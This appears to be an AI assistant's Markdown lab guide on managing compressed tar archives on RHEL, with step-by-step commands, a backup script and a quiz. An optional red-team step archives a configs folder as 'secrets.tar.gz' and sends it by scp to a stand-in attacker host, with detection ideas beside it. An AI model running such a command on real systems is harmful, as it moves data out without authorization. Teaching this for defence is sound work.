Absolutely, Shahid. Here's the **Markdown-formatted Cybersecurity Master Grade Edition** documentation for:

# 🧪 **Guided Exercise: Manage Compressed `tar` Archives**

*Module 13 – Archive and Transfer Files*
*Format: Cybersecurity Documentation Protocol Ultra v5.0*

---

## 🔰 Introduction

This guided exercise reinforces your practical understanding of managing compressed `tar` archives using hands-on, **step-by-step instructions on a RHEL system**. It simulates real-world use cases such as:

* Archiving and compressing logs or configurations
* Extracting backups
* Validating archive contents
* Incorporating automation with shell scripting

> 🎯 **Objective**: Master `tar` syntax, understand compression types, simulate backup workflows, and apply red/blue team thinking in a real RHEL environment.

---

## 🧠 Core Concepts Recap

Before we dive into commands, recall:

| Flag | Meaning                             |
| ---- | ----------------------------------- |
| `-c` | Create archive                      |
| `-x` | Extract archive                     |
| `-t` | List archive contents               |
| `-z` | Use gzip compression                |
| `-j` | Use bzip2 compression               |
| `-J` | Use xz compression                  |
| `-v` | Verbose (see files being processed) |
| `-f` | Use archive filename                |

---

## 🧪 Guided Lab Tasks (Step-by-Step)

> 🧰 All commands tested on **RHEL 9**. You can run these in a VM or on a lab machine.

---

### 🔹 **Step 1: Prepare the Test Directory**

```bash
mkdir -p ~/archive_lab/logs ~/archive_lab/configs
echo "Log entry 1" > ~/archive_lab/logs/log1.txt
echo "server=192.168.1.10" > ~/archive_lab/configs/web.conf
```

✅ **Expected Result**:
Directory structure created with test files.

---

### 🔹 **Step 2: Create a `.tar.gz` Archive**

```bash
tar -czvf archive_lab.tar.gz ~/archive_lab
```

✅ **Expected Output**:

```plaintext
~/archive_lab/
~/archive_lab/logs/
~/archive_lab/logs/log1.txt
~/archive_lab/configs/
~/archive_lab/configs/web.conf
```

---

### 🔹 **Step 3: List Archive Contents**

```bash
tar -tzvf archive_lab.tar.gz
```

✅ **Expected Output**: Lists file structure inside the archive.

---

### 🔹 **Step 4: Extract Archive to a New Location**

```bash
mkdir ~/extracted_lab
tar -xzvf archive_lab.tar.gz -C ~/extracted_lab/
```

✅ **Check**:

```bash
ls ~/extracted_lab/archive_lab
```

---

### 🔹 **Step 5: Create a `.tar.bz2` and `.tar.xz`**

```bash
tar -cjvf archive_bz2.tar.bz2 ~/archive_lab
tar -cJvf archive_xz.tar.xz ~/archive_lab
```

✅ **Compare File Sizes**:

```bash
ls -lh archive_*.tar.*
```

Observe which compression yields smallest file size.

---

### 🔹 **Step 6: Automate Backup with a Script**

```bash
nano ~/archive_lab/backup.sh
```

```bash
#!/bin/bash
DATE=$(date +%F)
tar -czf ~/backup-$DATE.tar.gz ~/archive_lab
```

Make it executable:

```bash
chmod +x ~/archive_lab/backup.sh
```

---

### 🔹 **Step 7: (Optional) Exfiltration Simulation (Red Team)**

```bash
tar -czf secrets.tar.gz ~/archive_lab/configs
scp secrets.tar.gz attacker@192.168.1.100:/tmp/
```

🔴 *MITRE T1560.001 - Archive Collected Data*

---

## 🛡 Red/Blue Team Reflection

| Team    | Action                   | MITRE Mapping         | Defense Idea               |
| ------- | ------------------------ | --------------------- | -------------------------- |
| 🔴 Red  | Archive + SCP            | T1560.001 + T1048.002 | Limit `scp`, Monitor `tar` |
| 🔵 Blue | Audit `tar`, Monitor SCP | Auditd + Logs         | File integrity + alerts    |

---

## 🧠 Quiz Check (Mini)

1. What’s the purpose of `-z` in `tar`?
2. How do you extract a `.tar.bz2` archive?
3. Why might `tar -tzvf` be useful in forensics?

---

## 📓 Journaling

* ✅ *Did you complete the full exercise?* Yes / No
* 🧠 *What did you learn or struggle with?*
  `_______________________________________`
* 🔁 *Which flag(s) did you forget and need to revise?*
  `_______________________________________`
* 💡 *Confidence Level (1–5)*: `__`

---

## 📌 Summary Table

| Task                  | Command                             |
| --------------------- | ----------------------------------- |
| Create gzip archive   | `tar -czvf archive.tar.gz dir/`     |
| List archive contents | `tar -tzvf archive.tar.gz`          |
| Extract gzip archive  | `tar -xzvf archive.tar.gz -C path/` |
| Compress with bzip2   | `tar -cjvf archive.tar.bz2 dir/`    |
| Compress with xz      | `tar -cJvf archive.tar.xz dir/`     |
| Scripted archive      | Bash script using `tar -czf`        |

---

## 🧭 Job & Cert Mapping

| Role              | Skill Applied                      | Cert          |
| ----------------- | ---------------------------------- | ------------- |
| SOC Analyst       | Detect `.tar.gz` usage in logs     | CompTIA+, CEH |
| Sysadmin          | Automate backups with `tar`        | RHCSA         |
| Forensics Analyst | Inspect `.tar.gz` in incidents     | GCFA          |
| Pentester         | Exfiltration simulation with `tar` | OSCP          |

---

## 🧠 Spaced Repetition Plan

* **Day 1**: Re-do lab steps manually
* **Day 3**: Script automation + cron job
* **Day 7**: Red team + blue team simulation (SCP, detection)
* **Day 30**: Teach a peer or write a blog/tutorial

---

✅ **Completed Guided Exercise: Manage Compressed tar Archives**

Let me know the **next lesson** in Module 13 you'd like me to document!
